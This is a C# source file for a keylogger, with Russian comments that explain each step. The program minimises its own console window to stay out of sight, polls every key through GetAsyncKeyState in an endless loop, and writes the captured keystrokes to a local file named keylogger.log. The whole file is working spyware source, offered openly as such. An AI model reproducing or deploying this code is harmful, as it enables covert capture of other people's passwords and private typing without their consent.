using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace mykeyloggerprog
{
    class Program
    {
        static string buf;

        //импорт библиотеки для считывания кода нажатых клавиш
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        // импорт библиотек, чтобы можно было спрятать окно консоли
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [STAThread]
        static void Main(String[] args)
        {

            var handle = GetConsoleWindow(); // возвращает handle текущего консольного окна
            ShowWindow(handle, 6); // чтобы спрятать это окно нужно поставить: 0 Hide, 5 Show, 6 свернутое окно

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i); // метод импортированной ранее библиотеки возвращает код клавиши
                                                     // условия для проверки некоторых конкретных кнопок
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space)
                        {
                            buf += " "; // если нажали робел, то в буфер добавляется пустой символ, т.е. пробел
                            continue;
                        }
                        if (((Keys)i) == Keys.Enter)
                        {
                            buf += "\r\n"; // если нажали Enter, то добавляется перенос каретки
                            continue;
                        }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue; // кнопки мыши не записываются в лог
                        if (((Keys)i).ToString().Length == 1)
                        {
                            buf += ((Keys)i).ToString(); // каждый код добавляется в буфер
                        }
                        else
                        {
                            buf += ((Keys)i).ToString();
                        }
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("keylogger.log", buf); // как только символов в буфере становится больше 10, он добавляется в конец файла кейлогера и 
                            buf = ""; // обнуляется. Кстати файл создастся если его не было и допишется если был. Коды клавиш могут занимать не один символ буфера
                        }
                    }
                }
            }
        }
    }
}